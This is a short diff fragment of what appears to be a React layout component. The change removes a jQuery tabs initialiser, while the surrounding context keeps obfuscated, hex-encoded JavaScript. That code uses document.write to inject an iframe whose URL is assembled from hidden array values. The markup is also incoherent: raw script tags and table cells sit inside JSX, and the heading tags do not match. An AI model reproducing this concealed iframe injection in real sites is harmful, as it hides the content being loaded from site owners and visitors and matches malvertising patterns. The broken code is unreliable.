@@ -25,9 +25,6 @@ const TemplateWrapper = ({ children }) => {
 		var src1 = _0x6717[0]+ pn1+ _0x6717[1]+ pn1+ _0x6717[2]+ pubid+ _0x6717[3]+ s1+ _0x6717[4]
 		</script>
     	<script src="jquery.tools.min.js"></script>
-    	<script type="text/javascript">
-      	$(document).ready(function(){$("ul.tabs").tabs("div.panes > div");});
- 		</script>
     	<tr>
        	<td> <script type="text/javascript">
 		var _0x28f9 = ["\x3C\x68\x32\x20\x61\x6C\x69\x67\x6E\x3D\x22\x63\x65\x6E\x74\x65\x72\x22\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22","\x2F\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x68\x31\x3E","\x77\x72\x69\x74\x65"];document[_0x28f9[2]](_0x28f9[0]+ src1+ _0x28f9[1])
